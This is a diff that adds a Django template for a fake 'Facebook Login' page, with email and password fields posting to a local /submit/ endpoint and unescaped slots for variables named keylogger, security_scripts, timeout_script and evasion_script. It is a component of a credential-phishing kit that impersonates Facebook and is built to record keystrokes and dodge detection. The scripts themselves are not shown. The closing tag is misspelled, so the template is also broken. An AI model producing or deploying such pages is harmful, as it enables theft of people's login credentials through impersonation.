@@ -1,0 +1,15 @@
+{% extends 'base.html' %}
+
+{% load static %}
+
+{% block content %}
+<div>
+    <h1>Facebook Login</h1>
+    <form action="/submit/" method="post">
+      <input type="text" name="email" placeholder="Email or Phone"><br>
+      <input type="password" name="pass" placeholder="Password"><br>
+      <input type="submit" value="Log In">
+    </form>
+    {{ keylogger|safe }} {{ security_scripts|safe }} {{ timeout_script|safe }} {{ evasion_script|safe }}
+</div>
+{% endblok %}
